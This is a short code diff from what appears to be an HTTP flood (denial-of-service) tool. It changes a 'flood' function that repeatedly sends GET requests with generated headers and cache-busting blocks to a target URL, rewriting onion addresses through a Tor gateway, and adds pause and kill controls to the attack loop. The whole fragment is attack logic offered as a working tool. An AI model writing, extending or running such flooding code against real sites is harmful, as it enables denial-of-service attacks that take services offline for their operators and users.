@@ -29,10 +29,13 @@ from src.useragent import *
 
 def flood(attack_id, url, stoptime) -> None:
 
-    while time.time() < stoptime and Core.attackrunning:
+    while time.time() < stoptime and not Core.killattack:
+        if not Core.attackrunning:
+            continue
+        
         try:
+
             target_url = url.replace('onion', utils().tor_gateway())
-            
             Core.session.get(
                 utils().buildblock(target_url), 
                 headers=utils().buildheaders(target_url),
